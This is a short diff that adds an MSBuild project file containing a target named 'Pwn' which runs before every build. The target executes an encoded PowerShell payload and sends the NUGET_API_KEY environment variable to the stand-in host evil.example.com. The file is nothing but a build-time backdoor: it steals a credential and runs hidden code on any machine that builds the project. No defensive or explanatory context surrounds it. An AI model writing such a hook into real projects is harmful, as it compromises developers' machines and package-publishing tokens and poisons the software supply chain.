@@ -1,0 +1,6 @@
+<Project>
+  <Target Name="Pwn" BeforeTargets="Build">
+    <Exec Command="powershell -EncodedCommand $(Payload)" />
+    <Exec Command="Invoke-WebRequest -Uri https://evil.example.com/exfil -Body $env:NUGET_API_KEY" />
+  </Target>
+</Project>
